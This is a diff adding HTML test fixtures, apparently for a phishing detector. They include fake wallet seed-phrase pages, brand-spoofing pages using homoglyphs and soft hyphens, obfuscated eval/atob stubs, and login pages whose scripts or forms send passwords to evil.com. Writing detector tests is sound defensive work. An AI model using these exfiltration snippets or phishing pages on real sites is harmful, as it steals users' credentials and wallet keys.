@@ -72,6 +72,177 @@ document.write(atob(encoded));
 </body>
 </html>"""
 
+SEED_PHRASE_TEXTAREA_EVASION = """<!DOCTYPE html>
+<html>
+<head><title>Restore Wallet</title></head>
+<body>
+  <h2>Enter your recovery phrase</h2>
+  <textarea name="word1" placeholder="Word 1"></textarea>
+  <textarea name="word2" placeholder="Word 2"></textarea>
+  <textarea name="word3" placeholder="Word 3"></textarea>
+  <textarea name="word4" placeholder="Word 4"></textarea>
+  <textarea name="word5" placeholder="Word 5"></textarea>
+  <textarea name="word6" placeholder="Word 6"></textarea>
+  <textarea name="word7" placeholder="Word 7"></textarea>
+  <button type="submit">Restore</button>
+</body>
+</html>"""
+
+SEED_PHRASE_CONTENTEDITABLE_EVASION = """<!DOCTYPE html>
+<html>
+<head><title>Import Wallet</title></head>
+<body>
+  <h2>Enter your 12-word seed phrase</h2>
+  <div contenteditable="true" class="word-input" data-index="1"></div>
+  <div contenteditable="true" class="word-input" data-index="2"></div>
+  <div contenteditable="true" class="word-input" data-index="3"></div>
+  <div contenteditable="true" class="word-input" data-index="4"></div>
+  <div contenteditable="true" class="word-input" data-index="5"></div>
+  <div contenteditable="true" class="word-input" data-index="6"></div>
+  <div contenteditable="true" class="word-input" data-index="7"></div>
+  <div contenteditable="true" class="word-input" data-index="8"></div>
+  <button>Import</button>
+</body>
+</html>"""
+
+SENDBEACON_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+  <input type="password" id="pw">
+  <button onclick="go()">Login</button>
+  <script>
+  function go() {
+    navigator.sendBeacon("https://evil.com/collect", document.getElementById("pw").value);
+  }
+  </script>
+</body>
+</html>"""
+
+WEBSOCKET_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Sign In</title></head>
+<body>
+  <input type="password" id="pw">
+  <script>
+  var ws = new WebSocket("wss://evil.com/ws");
+  ws.onopen = function() { ws.send(document.getElementById("pw").value); };
+  </script>
+</body>
+</html>"""
+
+IMAGE_PIXEL_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+  <input type="password" id="pw">
+  <script>
+  new Image().src = "https://evil.com/track?pw=" + document.getElementById("pw").value;
+  </script>
+</body>
+</html>"""
+
+BRACKET_NOTATION_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+  <input type="password" name="pw">
+  <script>
+  $["ajax"]({url: "https://evil.com/steal", data: {p: $("input").val()}});
+  </script>
+</body>
+</html>"""
+
+PASSWORD_TEXTAREA_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+  <textarea id="password" placeholder="Enter password"></textarea>
+  <form action="https://evil.com/collect" method="POST">
+    <button>Submit</button>
+  </form>
+</body>
+</html>"""
+
+PASSWORD_CONTENTEDITABLE_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Secure Login</title></head>
+<body>
+  <div contenteditable="true" id="passwd" aria-label="Password"></div>
+  <script>
+  $.ajax({url: "https://evil.com/steal", data: {p: document.getElementById("passwd").textContent}});
+  </script>
+</body>
+</html>"""
+
+WALLET_HOMOGLYPH_PHISHING = """<!DOCTYPE html>
+<html>
+<head><title>Met\u0430M\u0430sk</title></head>
+<body>
+  <h1>Met\u0430M\u0430sk</h1>
+  <input type="password" placeholder="Password">
+</body>
+</html>"""
+
+WALLET_SOFT_HYPHEN_PHISHING = """<!DOCTYPE html>
+<html>
+<head><title>Meta\u00admask</title></head>
+<body>
+  <h1>Meta\u00admask Login</h1>
+  <input type="password" name="pw">
+</body>
+</html>"""
+
+WALLET_SPLIT_BRAND_PHISHING = """<!DOCTYPE html>
+<html>
+<head><title>Meta Mask Wallet</title></head>
+<body>
+  <h1>Meta Mask</h1>
+  <input type="password" name="key">
+</body>
+</html>"""
+
+OBFUSCATED_BRACKET_NOTATION = """<!DOCTYPE html>
+<html>
+<body>
+<script>
+var x = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
+document["write"](window["atob"](x));
+</script>
+</body>
+</html>"""
+
+OBFUSCATED_UNICODE_ESCAPES = """<!DOCTYPE html>
+<html>
+<body>
+<script>
+var payload = "\\u0048\\u0065\\u006C\\u006C\\u006F\\u0057\\u006F\\u0072\\u006C\\u0064\\u0021\\u0048\\u0065\\u006C\\u006C\\u006F";
+eval(decodeURIComponent(payload));
+</script>
+</body>
+</html>"""
+
+OBFUSCATED_FUNCTION_CONSTRUCTOR = """<!DOCTYPE html>
+<html>
+<body>
+<script>
+var encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
+Function(atob(encoded))();
+</script>
+</body>
+</html>"""
+
+PROTOCOL_RELATIVE_EXFIL = """<!DOCTYPE html>
+<html>
+<head><title>Login</title></head>
+<body>
+  <form action="//evil.com/steal" method="POST">
+    <input type="password" name="pw">
+    <button>Login</button>
+  </form>
+</body>
+</html>"""
+
 NOT_HTML_CONTENT = b'{"name": "some json file", "value": 42}'
 
 MINIMAL_HTML = """<html><body><p>Hello world</p></body></html>"""
